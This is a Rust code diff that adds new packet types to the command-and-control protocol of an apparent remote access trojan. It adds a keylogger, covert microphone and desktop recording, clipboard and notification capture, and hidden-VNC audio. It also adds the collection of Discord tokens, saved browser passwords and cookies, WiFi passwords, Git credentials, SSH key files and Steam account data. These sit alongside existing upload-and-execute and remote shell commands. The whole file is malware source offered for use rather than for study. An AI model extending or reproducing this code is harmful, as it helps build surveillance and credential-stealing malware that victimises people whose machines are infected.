@@ -19,6 +19,7 @@ pub enum ServerboundPacket {
     ScreenshotResult(ScreenshotData),
     WebcamResult(Vec<u8>),
     RemoteDesktopFrame(RemoteDesktopFrame),
+    RemoteDesktopAudioChunk(RemoteDesktopAudioChunk),
     ProcessList(ProcessList),
     ShellOutput(String),
     InputBoxResult(String),
@@ -30,6 +31,28 @@ pub enum ServerboundPacket {
     CurrentFolder(String),   
 
     HVNCFrame(Vec<u8>),
+    HVNCFrameAudioChunk(HVNCFrameAudioChunk),
+
+    // Keylogger
+    KeyloggerUpdate(KeyloggerUpdate),
+    KeyloggerOfflineLogs(Vec<String>),
+    MicDeviceList(Vec<MicDeviceInfo>),
+    MicAudioChunk(MicAudioChunk),
+    MicRecordingFile(FileData),
+    DesktopRecordingPreviewFrame(DesktopRecordingPreviewFrame),
+    DesktopRecordingFile(FileData),
+    DiscordTokenData(DiscordTokenData),
+    BrowserData(BrowserData),
+    WifiData(WifiData),
+    SoftwareInventory(SoftwareInventory),
+    SoftwareIconResult(SoftwareIconResult),
+    SoftwareActionResult(SoftwareActionResult),
+    GitData(GitData),
+    SSHData(SSHData),
+    SteamData(SteamData),
+    ClipboardUpdate(ClipboardUpdate),
+    ClipboardImageUpdate(ClipboardImageUpdate),
+    NotificationEvent(NotificationEvent),
 }
 
 impl Packet for ServerboundPacket {
@@ -52,6 +75,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::ScreenshotResult(_) => "Screenshot Result",
             ServerboundPacket::WebcamResult(_) => "Webcam Result",
             ServerboundPacket::RemoteDesktopFrame(_) => "Remote Desktop Frame",
+            ServerboundPacket::RemoteDesktopAudioChunk(_) => "Remote Desktop Audio Chunk",
             ServerboundPacket::ProcessList(_) => "Process List",
             ServerboundPacket::ShellOutput(_) => "Shell Output",
             ServerboundPacket::InputBoxResult(_) => "Input Box Result",
@@ -60,6 +84,26 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::FileList(_) => "File List",
             ServerboundPacket::CurrentFolder(_) => "Current Folder",
             ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
+            ServerboundPacket::HVNCFrameAudioChunk(_) => "HVNC Frame Audio Chunk",
+            ServerboundPacket::KeyloggerUpdate(_) => "Keylogger Update",
+            ServerboundPacket::KeyloggerOfflineLogs(_) => "Keylogger Offline Logs",
+            ServerboundPacket::MicDeviceList(_) => "Mic Device List",
+            ServerboundPacket::MicAudioChunk(_) => "Mic Audio Chunk",
+            ServerboundPacket::MicRecordingFile(_) => "Mic Recording File",
+            ServerboundPacket::DesktopRecordingPreviewFrame(_) => "Desktop Recording Preview Frame",
+            ServerboundPacket::DesktopRecordingFile(_) => "Desktop Recording File",
+            ServerboundPacket::DiscordTokenData(_) => "Discord Token Data",
+            ServerboundPacket::BrowserData(_) => "Browser Data",
+            ServerboundPacket::WifiData(_) => "WiFi Data",
+            ServerboundPacket::SoftwareInventory(_) => "Software Inventory",
+            ServerboundPacket::SoftwareIconResult(_) => "Software Icon Result",
+            ServerboundPacket::SoftwareActionResult(_) => "Software Action Result",
+            ServerboundPacket::GitData(_) => "Git Data",
+            ServerboundPacket::SSHData(_) => "SSH Data",
+            ServerboundPacket::SteamData(_) => "Steam Data",
+            ServerboundPacket::ClipboardUpdate(_) => "Clipboard Update",
+            ServerboundPacket::ClipboardImageUpdate(_) => "Clipboard Image Update",
+            ServerboundPacket::NotificationEvent(_) => "Notification Event",
         }
     }
 }
@@ -77,6 +121,16 @@ pub enum ClientboundPacket {
     Disconnect,
     StartRemoteDesktop(RemoteDesktopConfig),
     StopRemoteDesktop,
+    StartRemoteDesktopAudio,
+    StopRemoteDesktopAudio,
+    RequestMicDevices,
+    RequestDiscordTokens,
+    StartMicLive(String),
+    StopMicLive,
+    StartMicRecording(String),
+    StopMicRecording,
+    StartDesktopRecording(RemoteDesktopConfig),
+    StopDesktopRecording,
     MouseClick(MouseClickData),
     KeyboardInput(KeyboardInputData),
     VisitWebsite(VisitWebsiteData),
@@ -109,13 +163,35 @@ pub enum ClientboundPacket {
 
     StartHVNC,
     StopHVNC,
+    StartHVNCFrameAudio,
+    StopHVNCFrameAudio,
     OpenExplorer,
+    OpenHVNCProcess(String),
     
     UploadAndExecute(FileData),
     ExecuteFile(String),
     UploadFile(String, FileData),
 
     TrollClient(TrollCommand),
+
+    // Keylogger
+    StartKeylogger(bool), // true = real-time, false = offline only
+    StopKeylogger,
+    GetOfflineLogs,
+    ClearOfflineLogs,
+    GetBrowserData,
+    GetWifiData,
+    GetSoftwareInventory,
+    LaunchSoftware(String),
+    UninstallSoftware(String),
+    GetSoftwareIcon(String),
+    GetGitData,
+    GetSSHData,
+    GetSteamData,
+    StartClipboardMonitor,
+    StopClipboardMonitor,
+    StartNotificationCapture,
+    StopNotificationCapture,
 }
 
 impl Packet for ClientboundPacket {
@@ -140,8 +216,18 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::RequestWebcam => "Request Webcam",
             ClientboundPacket::Reconnect => "Reconnect",
             ClientboundPacket::Disconnect => "Disconnect",
-            ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
+                    ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
             ClientboundPacket::StopRemoteDesktop => "Stop Remote Desktop",
+            ClientboundPacket::StartRemoteDesktopAudio => "Start Remote Desktop Audio",
+            ClientboundPacket::StopRemoteDesktopAudio => "Stop Remote Desktop Audio",
+            ClientboundPacket::RequestMicDevices => "Request Mic Devices",
+            ClientboundPacket::RequestDiscordTokens => "Request Discord Tokens",
+            ClientboundPacket::StartMicLive(_) => "Start Mic Live",
+            ClientboundPacket::StopMicLive => "Stop Mic Live",
+            ClientboundPacket::StartMicRecording(_) => "Start Mic Recording",
+            ClientboundPacket::StopMicRecording => "Stop Mic Recording",
+            ClientboundPacket::StartDesktopRecording(_) => "Start Desktop Recording",
+            ClientboundPacket::StopDesktopRecording => "Stop Desktop Recording",
             ClientboundPacket::MouseClick(_) => "Mouse Click",
             ClientboundPacket::KeyboardInput(_) => "Keyboard Input",
             ClientboundPacket::VisitWebsite(_) => "Visit Website",
@@ -171,11 +257,31 @@ impl Packet for ClientboundPacket {
 
             ClientboundPacket::StartHVNC => "Start HVNC",
             ClientboundPacket::StopHVNC => "Stop HVNC",
+            ClientboundPacket::StartHVNCFrameAudio => "Start HVNC Frame Audio",
+            ClientboundPacket::StopHVNCFrameAudio => "Stop HVNC Frame Audio",
             ClientboundPacket::OpenExplorer => "Open Explorer",
+            ClientboundPacket::OpenHVNCProcess(_) => "Open HVNC Process",
             ClientboundPacket::UploadAndExecute(_) => "Upload And Execute",
             ClientboundPacket::ExecuteFile(_) => "Execute File",
             ClientboundPacket::UploadFile(_, _) => "Upload File",
             ClientboundPacket::TrollClient(_) => "Troll Client",
+            ClientboundPacket::StartKeylogger(_) => "Start Keylogger",
+            ClientboundPacket::StopKeylogger => "Stop Keylogger",
+            ClientboundPacket::GetOfflineLogs => "Get Offline Logs",
+            ClientboundPacket::ClearOfflineLogs => "Clear Offline Logs",
+            ClientboundPacket::GetBrowserData => "Get Browser Data",
+            ClientboundPacket::GetWifiData => "Get Wifi Data",
+            ClientboundPacket::GetSoftwareInventory => "Get Software Inventory",
+            ClientboundPacket::LaunchSoftware(_) => "Launch Software",
+            ClientboundPacket::UninstallSoftware(_) => "Uninstall Software",
+            ClientboundPacket::GetSoftwareIcon(_) => "Get Software Icon",
+            ClientboundPacket::GetGitData => "Get Git Data",
+            ClientboundPacket::GetSSHData => "Get SSH Data",
+            ClientboundPacket::GetSteamData => "Get Steam Data",
+            ClientboundPacket::StartClipboardMonitor => "Start Clipboard Monitor",
+            ClientboundPacket::StopClipboardMonitor => "Stop Clipboard Monitor",
+            ClientboundPacket::StartNotificationCapture => "Start Notification Capture",
+            ClientboundPacket::StopNotificationCapture => "Stop Notification Capture",
         }
     }
 }
@@ -188,12 +294,62 @@ pub struct RemoteDesktopConfig {
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct MicAudioChunk {
+    pub timestamp: u64,
+    pub sample_rate: u32,
+    pub channels: u16,
+    pub data: Vec<u8>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct DiscordTokenInfo {
+    pub source: String,
+    pub token: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct DiscordTokenData {
+    pub tokens: Vec<DiscordTokenInfo>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct MicDeviceInfo {
+    pub id: String,
+    pub name: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct DesktopRecordingPreviewFrame {
+    pub timestamp: u64,
+    pub display: i32,
+    pub width: usize,
+    pub height: usize,
+    pub data: Vec<u8>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
 pub struct RemoteDesktopFrame {
     pub timestamp: u64,
     pub display: i32,
     pub data: Vec<u8>, // JPEG encoded image data
     pub width: usize,
     pub height: usize,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct RemoteDesktopAudioChunk {
+    pub timestamp: u64,
+    pub sample_rate: u32,
+    pub channels: u16,
+    pub data: Vec<u8>, // PCM i16 audio data
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct HVNCFrameAudioChunk {
+    pub timestamp: u64,
+    pub sample_rate: u32,
+    pub channels: u16,
+    pub data: Vec<u8>, // PCM i16 audio data
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
@@ -267,6 +423,12 @@ pub struct ScreenshotData {
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct KeyloggerUpdate {
+    pub window_title: String,
+    pub key_data: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
 #[serde(tag = "type", content = "payload")]
 pub enum TrollCommand {
     HideDesktop(String),
@@ -290,3 +452,151 @@ pub enum TrollCommand {
     PianoKey(String),
 }
 
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct BrowserData {
+    pub browsers: Vec<BrowserResult>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct WifiProfile {
+    pub ssid: String,
+    pub password: String,
+    pub authentication: String,
+    pub cipher: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct WifiData {
+    pub profiles: Vec<WifiProfile>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SoftwareEntry {
+    pub name: String,
+    pub version: String,
+    pub publisher: String,
+    pub install_location: String,
+    pub uninstall_command: String,
+    pub executable_path: String,
+    pub icon_base64: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SoftwareInventory {
+    pub applications: Vec<SoftwareEntry>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SoftwareIconResult {
+    pub name: String,
+    pub icon_base64: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SoftwareActionResult {
+    pub name: String,
+    pub success: bool,
+    pub message: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct GitCredentialEntry {
+    pub source: String,
+    pub path: String,
+    pub url: String,
+    pub username: String,
+    pub password: String,
+    pub raw: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ExtractedFile {
+    pub path: String,
+    pub contents: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct GitData {
+    pub credentials: Vec<GitCredentialEntry>,
+    pub configs: Vec<ExtractedFile>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SSHData {
+    pub files: Vec<ExtractedFile>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SteamAccountEntry {
+    pub steam_id: String,
+    pub account_name: String,
+    pub persona_name: String,
+    pub remember_password: String,
+    pub last_logon: String,
+    pub details: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SteamData {
+    pub accounts: Vec<SteamAccountEntry>,
+    pub files: Vec<ExtractedFile>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ClipboardUpdate {
+    pub text: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ClipboardImageUpdate {
+    pub image_base64: String,
+    pub width: u32,
+    pub height: u32,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct NotificationEvent {
+    pub source: String,
+    pub title: String,
+    pub message: String,
+    pub timestamp: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct BrowserResult {
+    pub name: String,
+    pub passwords: Vec<PasswordEntry>,
+    pub cookies: Vec<CookieEntry>,
+    pub history: Vec<HistoryEntry>,
+    pub bookmarks: Vec<BookmarkEntry>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct PasswordEntry {
+    pub url: String,
+    pub username: String,
+    pub password: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct CookieEntry {
+    pub domain: String,
+    pub name: String,
+    pub value: String,
+    pub path: String,
+    pub expires: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct HistoryEntry {
+    pub url: String,
+    pub title: String,
+    pub visit_count: i32,
+    pub last_visit: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct BookmarkEntry {
+    pub url: String,
+    pub title: String,
+}
